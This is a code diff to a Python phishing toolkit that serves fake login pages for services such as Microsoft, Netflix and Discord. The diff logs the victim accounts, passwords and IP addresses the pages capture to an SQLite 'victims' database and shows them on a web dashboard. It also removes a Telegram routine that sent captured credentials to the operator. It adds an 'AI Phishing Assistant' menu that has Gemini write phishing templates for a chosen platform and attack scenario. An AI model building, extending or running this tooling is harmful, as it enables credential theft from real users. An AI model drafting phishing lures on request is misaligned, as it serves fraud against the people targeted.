@@ -11,13 +11,18 @@ import zipfile
 import tarfile
 import re
 import json
+import threading
 
 try:
-    import requests
     import qrcode
-except ImportError:
+    import database
+    from lib import ai_assistant
+except ImportError as e:
+    _missing = str(e).split("'")
+    _missing = _missing[-2] if len(_missing) >= 2 else str(e)
+    print(f"\n\033[1;38;2;255;50;50m[!] Missing dependency: {_missing}\033[0m")
     print(
-        "\n\033[1;38;2;255;50;50m[!] Missing dependencies. Please run: pip install -r requirements.txt\033[0m"
+        "\033[1;38;2;30;144;255m[*] Run: pip3 install -r requirements.txt --break-system-packages\033[0m"
     )
     sys.exit(1)
 
@@ -75,6 +80,9 @@ def setup_env():
         os.makedirs(".server")
     if not os.path.isdir("auth"):
         os.makedirs("auth")
+
+    database.init_db()  # Initialize SQLite
+
     if os.path.isdir(".server/www"):
         shutil.rmtree(".server/www")
     os.makedirs(".server/www")
@@ -297,56 +305,6 @@ def about():
         about()
 
 
-def send_telegram_alert(message):
-    telegram_file = "auth/telegram.json"
-    if os.path.exists(telegram_file):
-        try:
-            with open(telegram_file, "r") as f:
-                data = json.load(f)
-                bot_token = data.get("bot_token")
-                chat_id = data.get("chat_id")
-                if bot_token and chat_id:
-                    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-                    payload = {
-                        "chat_id": chat_id,
-                        "text": message,
-                        "parse_mode": "Markdown",
-                    }
-                    requests.post(url, json=payload, timeout=5)
-        except Exception:
-            pass
-
-
-def setup_telegram():
-    telegram_file = "auth/telegram.json"
-    print()
-    ans = input(
-        f"{DARK}[{WHITE}?{DARK}]{LIGHT2} Do You Want To Enable Telegram Alerts? {PURPLE}[{LIGHT2}y{PURPLE}/{LIGHT2}N{PURPLE}]: {LIGHT2}"
-    )
-    if ans.lower() == "y":
-        if os.path.exists(telegram_file):
-            print(
-                f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Using existing Telegram config in auth/telegram.json...{LIGHT1}"
-            )
-        else:
-            print("\n")
-            bot_token = input(
-                f"{DARK}[{WHITE}-{DARK}]{LIGHT2} Enter Your Bot Token : {LIGHT1}"
-            )
-            chat_id = input(
-                f"{DARK}[{WHITE}-{DARK}]{LIGHT2} Enter Your Chat ID : {LIGHT1}"
-            )
-            with open(telegram_file, "w") as f:
-                json.dump({"bot_token": bot_token, "chat_id": chat_id}, f)
-            print(
-                f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Telegram configured successfully!{LIGHT1}"
-            )
-    else:
-        print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Telegram Alerts Disabled.{LIGHT1}")
-        if os.path.exists(telegram_file):
-            os.remove(telegram_file)
-
-
 def generate_qr(url):
     print(f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Generating QR Code...{LIGHT1}")
     try:
@@ -358,8 +316,10 @@ def generate_qr(url):
         )
         qr.add_data(url)
         qr.make(fit=True)
+        qr_dir = "qrcodes"
+        os.makedirs(qr_dir, exist_ok=True)
         img = qr.make_image(fill_color="black", back_color="white")
-        qr_path = f"qr_{int(time.time())}.png"
+        qr_path = os.path.join(qr_dir, f"qr_{int(time.time())}.png")
         img.save(qr_path)
         print(
             f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} QR Code Saved As : {LIGHT2}{qr_path}{LIGHT1}"
@@ -447,9 +407,9 @@ def capture_ip():
         )
         with open("auth/ip.txt", "a") as f:
             f.writelines(lines)
-        send_telegram_alert(
-            f"🎯 *New IP Captured!*\n\n🌐 *IP:* `{ip}`\n📍 *Platform:* `{website}`"
-        )
+
+        # Save to SQLite for Dashboard
+        database.add_victim(website, "IP_ONLY", "N/A", ip)
 
 
 def capture_creds():
@@ -460,17 +420,31 @@ def capture_creds():
         password = ""
         for line in lines:
             if "Username:" in line:
-                account = line.split("Username:")[1].strip()
+                raw = line.split("Username:")[1].strip()
+                # If Pass: is on the same line, cut it off
+                if "Pass:" in raw:
+                    raw = raw.split("Pass:")[0].strip()
+                account = raw
             if "Pass:" in line:
-                password = line.split("Pass:")[1].split(".")[-1].strip()
+                password = line.split("Pass:")[-1].strip()
         print(f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Account : {MEDIUM}{account}")
         print(f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Password : {MEDIUM}{password}")
         print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Saved in : {LIGHT2}auth/usernames.dat")
         with open("auth/usernames.dat", "a") as f:
             f.writelines(lines)
-        send_telegram_alert(
-            f"🔥 *Credentials Captured!*\n\n👤 *Account:* `{account}`\n🔑 *Password:* `{password}`\n📍 *Platform:* `{website}`"
-        )
+
+        # Save to SQLite for Dashboard
+        # Extract IP from ip.txt if available, else N/A
+        ip = "Unknown"
+        if os.path.exists("auth/ip.txt"):
+            with open("auth/ip.txt", "r") as f:
+                last_lines = f.readlines()[-5:]  # Check last few lines
+                for l in last_lines:
+                    if "IP: " in l:
+                        ip = l.split("IP: ")[1].strip()
+
+        database.add_victim(website, account, password, ip)
+
         print(
             f"\n{DARK}[{WHITE}-{DARK}]{LIGHT2} Waiting for Next Login Info, {MEDIUM}Ctrl + C {LIGHT2}to exit. ",
             end="",
@@ -847,6 +821,11 @@ def main_menu():
     {DARK}\x5b{WHITE}04{DARK}\x5d{LIGHT2} Microsoft     {DARK}\x5b{WHITE}09{DARK}\x5d{LIGHT2} Discord       {DARK}\x5b{WHITE}14{DARK}\x5d{LIGHT2} Adobe
     {DARK}\x5b{WHITE}05{DARK}\x5d{LIGHT2} Netflix       {DARK}\x5b{WHITE}10{DARK}\x5d{LIGHT2} Pinterest     {DARK}\x5b{WHITE}15{DARK}\x5d{LIGHT2} Yandex
 
+    {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    {DARK}\x5b{WHITE}16{DARK}\x5d{PINK} AI Phishing Assistant   {LIGHT1}[ NEW ]
+    {DARK}\x5b{WHITE}17{DARK}\x5d{LIGHT1} Open Web Dashboard      {DARK}[ {LIGHT2}LIVE{DARK} ]
+    {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
     {DARK}\x5b{WHITE}99{DARK}\x5d{LIGHT2} About         {DARK}\x5b{WHITE}00{DARK}\x5d{LIGHT2} Exit
     """)
     reply = input(
@@ -883,6 +862,26 @@ def main_menu():
     elif reply in opts:
         website, mask = opts[reply]
         tunnel_menu()
+    elif reply in ["16"]:
+        ai_assistant_menu()
+    elif reply in ["17"]:
+        os.system("cls" if os.name == "nt" else "clear")
+        banner_small()
+        print(f"""
+    {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    {DARK}[{WHITE}+{DARK}]{LIGHT1} Web Dashboard is LIVE and running in the background
+    {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+    {DARK}[{WHITE}-{DARK}]{LIGHT2} Local URL   : {WHITE}http://localhost:5000
+    {DARK}[{WHITE}-{DARK}]{LIGHT2} Network URL : {WHITE}http://0.0.0.0:5000
+
+    {DARK}[{WHITE}-{DARK}]{MEDIUM} Open the URL above in your browser to access the dashboard.
+    {DARK}[{WHITE}-{DARK}]{MEDIUM} The dashboard runs continuously in the background.
+
+    {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        """)
+        input(f"    {DARK}[{WHITE}Enter{DARK}]{LIGHT2} Press Enter to return to Main Menu...")
+        main_menu()
     elif reply in ["99"]:
         about()
     elif reply in ["0", "00"]:
@@ -893,6 +892,59 @@ def main_menu():
         main_menu()
 
 
+def start_dashboard():
+    # Silent start for Flask
+    subprocess.Popen(
+        [sys.executable, "dashboard/app.py"],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+
+
+def ai_assistant_menu():
+    os.system("cls" if os.name == "nt" else "clear")
+    banner_small()
+    print(f"\n    {PINK}--- AI PHISHING ASSISTANT ---{RESET}")
+
+    if not ai_assistant.setup_ai():
+        print(f"\n    {DARK}[{WHITE}!{DARK}]{RED} Gemini API Key not found!")
+        key = input(
+            f"    {DARK}[{WHITE}-{DARK}]{LIGHT2} Please enter your Gemini API Key: {WHITE}"
+        )
+        if key:
+            ai_assistant.save_api_key(key)
+        else:
+            main_menu()
+            return
+
+    platform_name = input(
+        f"\n    {DARK}[{WHITE}?{DARK}]{LIGHT2} Target Platform (e.g. Instagram): {WHITE}"
+    )
+    scenario = input(
+        f"\n    {DARK}[{WHITE}?{DARK}]{LIGHT2} Attack Scenario (e.g. Account Security Alert): {WHITE}"
+    )
+
+    print(
+        f"\n    {PURPLE}[{LIGHT1}*{PURPLE}]{LIGHT2} Generating professional templates...{DARK}"
+    )
+    result = ai_assistant.generate_templates(platform_name, scenario)
+
+    # Save to txt file as backup
+    if not os.path.exists("ai_output"):
+        os.makedirs("ai_output")
+    filename = f"ai_output/phishing_{platform_name}_{int(time.time())}.txt"
+    with open(filename, "w", encoding="utf-8") as f:
+        f.write(f"Platform: {platform_name}\nScenario: {scenario}\n\n{result}")
+
+    print(f"\n{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
+    print(result)
+    print(f"{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
+    print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Also saved to : {WHITE}{filename}")
+
+    input(f"\n    {DARK}[{WHITE}Enter{DARK}]{LIGHT2} to return to main menu...")
+    main_menu()
+
+
 if __name__ == "__main__":
     kill_pid()
     dependencies()
@@ -900,5 +952,5 @@ if __name__ == "__main__":
     setup_env()
     install_cloudflared()
     install_localxpose()
-    setup_telegram()
+    start_dashboard()  # Start Web UI in background
     main_menu()
